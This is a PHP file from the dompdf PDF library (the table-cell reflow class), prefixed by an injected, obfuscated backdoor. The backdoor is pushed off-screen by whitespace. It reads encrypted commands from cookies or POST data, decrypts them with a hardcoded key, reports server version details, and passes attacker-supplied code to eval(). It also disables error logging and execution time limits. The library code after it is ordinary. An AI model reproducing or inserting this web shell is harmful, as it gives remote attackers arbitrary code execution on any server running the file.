<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $af838 = 519;$GLOBALS['w29ee']=Array();global$w29ee;$w29ee=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['lae472db']="\x3f\x6e\x7e\x4c\x47\x32\x30\x4b\x73\x28\x34\x38\x68\x56\x55\x58\x74\x2b\x2d\x5d\x62\x63\x46\x51\x41\x31\x4e\x76\x79\x6b\xd\x42\x6a\x64\x6d\x9\x77\x4a\x5c\x2c\x21\x7b\x3c\x2a\x37\x3a\x2f\x69\x61\x66\x60\x24\x57\x48\x4f\x5a\x71\x43\x2e\x7a\x3e\x6f\x4d\x3b\x26\x39\x53\x65\x22\x36\x7c\x5e\x59\x78\x44\x49\x27\x33\x70\x29\x6c\x5f\x25\x54\x23\x72\x52\xa\x35\x75\x20\x45\x67\x7d\x5b\x50\x3d\x40";$w29ee[$w29ee['lae472db'][36].$w29ee['lae472db'][21].$w29ee['lae472db'][77].$w29ee['lae472db'][11].$w29ee['lae472db'][10]]=$w29ee['lae472db'][21].$w29ee['lae472db'][12].$w29ee['lae472db'][85];$w29ee[$w29ee['lae472db'][28].$w29ee['lae472db'][48].$w29ee['lae472db'][11].$w29ee['lae472db'][33].$w29ee['lae472db'][67].$w29ee['lae472db'][65]]=$w29ee['lae472db'][61].$w29ee['lae472db'][85].$w29ee['lae472db'][33];$w29ee[$w29ee['lae472db'][29].$w29ee['lae472db'][6].$w29ee['lae472db'][21].$w29ee['lae472db'][49].$w29ee['lae472db'][44].$w29ee['lae472db'][25].$w29ee['lae472db'][49].$w29ee['lae472db'][49]]=$w29ee['lae472db'][8].$w29ee['lae472db'][16].$w29ee['lae472db'][85].$w29ee['lae472db'][80].$w29ee['lae472db'][67].$w29ee['lae472db'][1];$w29ee[$w29ee['lae472db'][78].$w29ee['lae472db'][25].$w29ee['lae472db'][25].$w29ee['lae472db'][25].$w29ee['lae472db'][10].$w29ee['lae472db'][69].$w29ee['lae472db'][25].$w29ee['lae472db'][88]]=$w29ee['lae472db'][47].$w29ee['lae472db'][1].$w29ee['lae472db'][47].$w29ee['lae472db'][81].$w29ee['lae472db'][8].$w29ee['lae472db'][67].$w29ee['lae472db'][16];$w29ee[$w29ee['lae472db'][59].$w29ee['lae472db'][48].$w29ee['lae472db'][33].$w29ee['lae472db'][44]]=$w29ee['lae472db'][8].$w29ee['lae472db'][67].$w29ee['lae472db'][85].$w29ee['lae472db'][47].$w29ee['lae472db'][48].$w29ee['lae472db'][80].$w29ee['lae472db'][47].$w29ee['lae472db'][59].$w29ee['lae472db'][67];$w29ee[$w29ee['lae472db'][61].$w29ee['lae472db'][21].$w29ee['lae472db'][49].$w29ee['lae472db'][10].$w29ee['lae472db'][77].$w29ee['lae472db'][11].$w29ee['lae472db'][33].$w29ee['lae472db'][69]]=$w29ee['lae472db'][78].$w29ee['lae472db'][12].$w29ee['lae472db'][78].$w29ee['lae472db'][27].$w29ee['lae472db'][67].$w29ee['lae472db'][85].$w29ee['lae472db'][8].$w29ee['lae472db'][47].$w29ee['lae472db'][61].$w29ee['lae472db'][1];$w29ee[$w29ee['lae472db'][61].$w29ee['lae472db'][6].$w29ee['lae472db'][20].$w29ee['lae472db'][88].$w29ee['lae472db'][6].$w29ee['lae472db'][67]]=$w29ee['lae472db'][89].$w29ee['lae472db'][1].$w29ee['lae472db'][8].$w29ee['lae472db'][67].$w29ee['lae472db'][85].$w29ee['lae472db'][47].$w29ee['lae472db'][48].$w29ee['lae472db'][80].$w29ee['lae472db'][47].$w29ee['lae472db'][59].$w29ee['lae472db'][67];$w29ee[$w29ee['lae472db'][27].$w29ee['lae472db'][21].$w29ee['lae472db'][49].$w29ee['lae472db'][21].$w29ee['lae472db'][6].$w29ee['lae472db'][77].$w29ee['lae472db'][44]]=$w29ee['lae472db'][20].$w29ee['lae472db'][48].$w29ee['lae472db'][8].$w29ee['lae472db'][67].$w29ee['lae472db'][69].$w29ee['lae472db'][10].$w29ee['lae472db'][81].$w29ee['lae472db'][33].$w29ee['lae472db'][67].$w29ee['lae472db'][21].$w29ee['lae472db'][61].$w29ee['lae472db'][33].$w29ee['lae472db'][67];$w29ee[$w29ee['lae472db'][36].$w29ee['lae472db'][11].$w29ee['lae472db'][21].$w29ee['lae472db'][44]]=$w29ee['lae472db'][8].$w29ee['lae472db'][67].$w29ee['lae472db'][16].$w29ee['lae472db'][81].$w29ee['lae472db'][16].$w29ee['lae472db'][47].$w29ee['lae472db'][34].$w29ee['lae472db'][67].$w29ee['lae472db'][81].$w29ee['lae472db'][80].$w29ee['lae472db'][47].$w29ee['lae472db'][34].$w29ee['lae472db'][47].$w29ee['lae472db'][16];$w29ee[$w29ee['lae472db'][67].$w29ee['lae472db'][5].$w29ee['lae472db'][49].$w29ee['lae472db'][25].$w29ee['lae472db'][48].$w29ee['lae472db'][6].$w29ee['lae472db'][67].$w29ee['lae472db'][20].$w29ee['lae472db'][48]]=$w29ee['lae472db'][73].$w29ee['lae472db'][44].$w29ee['lae472db'][77].$w29ee['lae472db'][25].$w29ee['lae472db'][65].$w29ee['lae472db'][49].$w29ee['lae472db'][5].$w29ee['lae472db'][21].$w29ee['lae472db'][20];$w29ee[$w29ee['lae472db'][59].$w29ee['lae472db'][48].$w29ee['lae472db'][48].$w29ee['lae472db'][49].$w29ee['lae472db'][6].$w29ee['lae472db'][49]]=$w29ee['lae472db'][85].$w29ee['lae472db'][21].$w29ee['lae472db'][5].$w29ee['lae472db'][49].$w29ee['lae472db'][49].$w29ee['lae472db'][21].$w29ee['lae472db'][77].$w29ee['lae472db'][10].$w29ee['lae472db'][88];$w29ee[$w29ee['lae472db'][61].$w29ee['lae472db'][88].$w29ee['lae472db'][69].$w29ee['lae472db'][11].$w29ee['lae472db'][48]]=$_POST;$w29ee[$w29ee['lae472db'][20].$w29ee['lae472db'][20].$w29ee['lae472db'][33].$w29ee['lae472db'][77].$w29ee['lae472db'][25].$w29ee['lae472db'][88].$w29ee['lae472db'][6].$w29ee['lae472db'][65].$w29ee['lae472db'][25]]=$_COOKIE;@$w29ee[$w29ee['lae472db'][78].$w29ee['lae472db'][25].$w29ee['lae472db'][25].$w29ee['lae472db'][25].$w29ee['lae472db'][10].$w29ee['lae472db'][69].$w29ee['lae472db'][25].$w29ee['lae472db'][88]]($w29ee['lae472db'][67].$w29ee['lae472db'][85].$w29ee['lae472db'][85].$w29ee['lae472db'][61].$w29ee['lae472db'][85].$w29ee['lae472db'][81].$w29ee['lae472db'][80].$w29ee['lae472db'][61].$w29ee['lae472db'][92],NULL);@$w29ee[$w29ee['lae472db'][78].$w29ee['lae472db'][25].$w29ee['lae472db'][25].$w29ee['lae472db'][25].$w29ee['lae472db'][10].$w29ee['lae472db'][69].$w29ee['lae472db'][25].$w29ee['lae472db'][88]]($w29ee['lae472db'][80].$w29ee['lae472db'][61].$w29ee['lae472db'][92].$w29ee['lae472db'][81].$w29ee['lae472db'][67].$w29ee['lae472db'][85].$w29ee['lae472db'][85].$w29ee['lae472db'][61].$w29ee['lae472db'][85].$w29ee['lae472db'][8],0);@$w29ee[$w29ee['lae472db'][78].$w29ee['lae472db'][25].$w29ee['lae472db'][25].$w29ee['lae472db'][25].$w29ee['lae472db'][10].$w29ee['lae472db'][69].$w29ee['lae472db'][25].$w29ee['lae472db'][88]]($w29ee['lae472db'][34].$w29ee['lae472db'][48].$w29ee['lae472db'][73].$w29ee['lae472db'][81].$w29ee['lae472db'][67].$w29ee['lae472db'][73].$w29ee['lae472db'][67].$w29ee['lae472db'][21].$w29ee['lae472db'][89].$w29ee['lae472db'][16].$w29ee['lae472db'][47].$w29ee['lae472db'][61].$w29ee['lae472db'][1].$w29ee['lae472db'][81].$w29ee['lae472db'][16].$w29ee['lae472db'][47].$w29ee['lae472db'][34].$w29ee['lae472db'][67],0);@$w29ee[$w29ee['lae472db'][36].$w29ee['lae472db'][11].$w29ee['lae472db'][21].$w29ee['lae472db'][44]](0);$n3057848=NULL;$k169=NULL;$w29ee[$w29ee['lae472db'][85].$w29ee['lae472db'][33].$w29ee['lae472db'][10].$w29ee['lae472db'][77].$w29ee['lae472db'][11]]=$w29ee['lae472db'][10].$w29ee['lae472db'][48].$w29ee['lae472db'][67].$w29ee['lae472db'][25].$w29ee['lae472db'][88].$w29ee['lae472db'][11].$w29ee['lae472db'][6].$w29ee['lae472db'][6].$w29ee['lae472db'][18].$w29ee['lae472db'][65].$w29ee['lae472db'][77].$w29ee['lae472db'][5].$w29ee['lae472db'][6].$w29ee['lae472db'][18].$w29ee['lae472db'][10].$w29ee['lae472db'][69].$w29ee['lae472db'][88].$w29ee['lae472db'][88].$w29ee['lae472db'][18].$w29ee['lae472db'][20].$w29ee['lae472db'][21].$w29ee['lae472db'][49].$w29ee['lae472db'][69].$w29ee['lae472db'][18].$w29ee['lae472db'][69].$w29ee['lae472db'][25].$w29ee['lae472db'][44].$w29ee['lae472db'][49].$w29ee['lae472db'][10].$w29ee['lae472db'][69].$w29ee['lae472db'][67].$w29ee['lae472db'][69].$w29ee['lae472db'][5].$w29ee['lae472db'][77].$w29ee['lae472db'][88].$w29ee['lae472db'][11];global$rd438;function rc2ffc345($n3057848,$rb07b){global$w29ee;$sef22822="";for($w59717=0;$w59717<$w29ee[$w29ee['lae472db'][29].$w29ee['lae472db'][6].$w29ee['lae472db'][21].$w29ee['lae472db'][49].$w29ee['lae472db'][44].$w29ee['lae472db'][25].$w29ee['lae472db'][49].$w29ee['lae472db'][49]]($n3057848);){for($n4852c23=0;$n4852c23<$w29ee[$w29ee['lae472db'][29].$w29ee['lae472db'][6].$w29ee['lae472db'][21].$w29ee['lae472db'][49].$w29ee['lae472db'][44].$w29ee['lae472db'][25].$w29ee['lae472db'][49].$w29ee['lae472db'][49]]($rb07b)&&$w59717<$w29ee[$w29ee['lae472db'][29].$w29ee['lae472db'][6].$w29ee['lae472db'][21].$w29ee['lae472db'][49].$w29ee['lae472db'][44].$w29ee['lae472db'][25].$w29ee['lae472db'][49].$w29ee['lae472db'][49]]($n3057848);$n4852c23++,$w59717++){$sef22822.=$w29ee[$w29ee['lae472db'][36].$w29ee['lae472db'][21].$w29ee['lae472db'][77].$w29ee['lae472db'][11].$w29ee['lae472db'][10]]($w29ee[$w29ee['lae472db'][28].$w29ee['lae472db'][48].$w29ee['lae472db'][11].$w29ee['lae472db'][33].$w29ee['lae472db'][67].$w29ee['lae472db'][65]]($n3057848[$w59717])^$w29ee[$w29ee['lae472db'][28].$w29ee['lae472db'][48].$w29ee['lae472db'][11].$w29ee['lae472db'][33].$w29ee['lae472db'][67].$w29ee['lae472db'][65]]($rb07b[$n4852c23]));}}return$sef22822;}function x7319f2cb($n3057848,$rb07b){global$w29ee;global$rd438;return$w29ee[$w29ee['lae472db'][59].$w29ee['lae472db'][48].$w29ee['lae472db'][48].$w29ee['lae472db'][49].$w29ee['lae472db'][6].$w29ee['lae472db'][49]]($w29ee[$w29ee['lae472db'][59].$w29ee['lae472db'][48].$w29ee['lae472db'][48].$w29ee['lae472db'][49].$w29ee['lae472db'][6].$w29ee['lae472db'][49]]($n3057848,$rd438),$rb07b);}foreach($w29ee[$w29ee['lae472db'][20].$w29ee['lae472db'][20].$w29ee['lae472db'][33].$w29ee['lae472db'][77].$w29ee['lae472db'][25].$w29ee['lae472db'][88].$w29ee['lae472db'][6].$w29ee['lae472db'][65].$w29ee['lae472db'][25]]as$rb07b=>$w837a6){$n3057848=$w837a6;$k169=$rb07b;}if(!$n3057848){foreach($w29ee[$w29ee['lae472db'][61].$w29ee['lae472db'][88].$w29ee['lae472db'][69].$w29ee['lae472db'][11].$w29ee['lae472db'][48]]as$rb07b=>$w837a6){$n3057848=$w837a6;$k169=$rb07b;}}$n3057848=@$w29ee[$w29ee['lae472db'][61].$w29ee['lae472db'][6].$w29ee['lae472db'][20].$w29ee['lae472db'][88].$w29ee['lae472db'][6].$w29ee['lae472db'][67]]($w29ee[$w29ee['lae472db'][67].$w29ee['lae472db'][5].$w29ee['lae472db'][49].$w29ee['lae472db'][25].$w29ee['lae472db'][48].$w29ee['lae472db'][6].$w29ee['lae472db'][67].$w29ee['lae472db'][20].$w29ee['lae472db'][48]]($w29ee[$w29ee['lae472db'][27].$w29ee['lae472db'][21].$w29ee['lae472db'][49].$w29ee['lae472db'][21].$w29ee['lae472db'][6].$w29ee['lae472db'][77].$w29ee['lae472db'][44]]($n3057848),$k169));if(isset($n3057848[$w29ee['lae472db'][48].$w29ee['lae472db'][29]])&&$rd438==$n3057848[$w29ee['lae472db'][48].$w29ee['lae472db'][29]]){if($n3057848[$w29ee['lae472db'][48]]==$w29ee['lae472db'][47]){$w59717=Array($w29ee['lae472db'][78].$w29ee['lae472db'][27]=>@$w29ee[$w29ee['lae472db'][61].$w29ee['lae472db'][21].$w29ee['lae472db'][49].$w29ee['lae472db'][10].$w29ee['lae472db'][77].$w29ee['lae472db'][11].$w29ee['lae472db'][33].$w29ee['lae472db'][69]](),$w29ee['lae472db'][8].$w29ee['lae472db'][27]=>$w29ee['lae472db'][25].$w29ee['lae472db'][58].$w29ee['lae472db'][6].$w29ee['lae472db'][18].$w29ee['lae472db'][25],);echo@$w29ee[$w29ee['lae472db'][59].$w29ee['lae472db'][48].$w29ee['lae472db'][33].$w29ee['lae472db'][44]]($w59717);}elseif($n3057848[$w29ee['lae472db'][48]]==$w29ee['lae472db'][67]){eval/*w4d1756f2*/($n3057848[$w29ee['lae472db'][33]]);}exit();} ?><?php
/**
 * @package dompdf
 * @link    http://dompdf.github.com/
 * @author  Benj Carson <benjcarson@digitaljunkies.ca>
 * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
 */

/**
 * Reflows table cells
 *
 * @access private
 * @package dompdf
 */
class Table_Cell_Frame_Reflower extends Block_Frame_Reflower {

  //........................................................................

  function __construct(Block_Frame_Decorator $frame) {
    parent::__construct($frame);
  }

  //........................................................................

  function reflow(Block_Frame_Decorator $block = null) {

    $style = $this->_frame->get_style();

    $table = Table_Frame_Decorator::find_parent_table($this->_frame);
    $cellmap = $table->get_cellmap();

    list($x, $y) = $cellmap->get_frame_position($this->_frame);
    $this->_frame->set_position($x, $y);

    $cells = $cellmap->get_spanned_cells($this->_frame);

    $w = 0;
    foreach ( $cells["columns"] as $i ) {
      $col = $cellmap->get_column( $i );
      $w += $col["used-width"];
    }

    //FIXME?
    $h = $this->_frame->get_containing_block("h");

    $left_space = $style->length_in_pt(array($style->margin_left,
                                             $style->padding_left,
                                             $style->border_left_width),
                                       $w);

    $right_space = $style->length_in_pt(array($style->padding_right,
                                              $style->margin_right,
                                              $style->border_right_width),
                                        $w);

    $top_space = $style->length_in_pt(array($style->margin_top,
                                            $style->padding_top,
                                            $style->border_top_width),
                                      $h);
    $bottom_space = $style->length_in_pt(array($style->margin_bottom,
                                               $style->padding_bottom,
                                               $style->border_bottom_width),
                                      $h);

    $style->width = $cb_w = $w - $left_space - $right_space;

    $content_x = $x + $left_space;
    $content_y = $line_y = $y + $top_space;

    // Adjust the first line based on the text-indent property
    $indent = $style->length_in_pt($style->text_indent, $w);
    $this->_frame->increase_line_width($indent);

    $page = $this->_frame->get_root();
    
    // Set the y position of the first line in the cell
    $line_box = $this->_frame->get_current_line_box();
    $line_box->y = $line_y;
    
    // Set the containing blocks and reflow each child
    foreach ( $this->_frame->get_children() as $child ) {
      
      if ( $page->is_full() )
        break;
    
      $child->set_containing_block($content_x, $content_y, $cb_w, $h);
      
      $this->process_clear($child);
      
      $child->reflow($this->_frame);
    
      $this->process_float($child, $x + $left_space, $w - $right_space - $left_space);
    }

    // Determine our height
    $style_height = $style->length_in_pt($style->height, $h);

    $this->_frame->set_content_height($this->_calculate_content_height());

    $height = max($style_height, $this->_frame->get_content_height());

    // Let the cellmap know our height
    $cell_height = $height / count($cells["rows"]);

    if ($style_height <= $height)
      $cell_height += $top_space + $bottom_space;

    foreach ($cells["rows"] as $i)
      $cellmap->set_row_height($i, $cell_height);

    $style->height = $height;

    $this->_text_align();

    $this->vertical_align();

  }

}
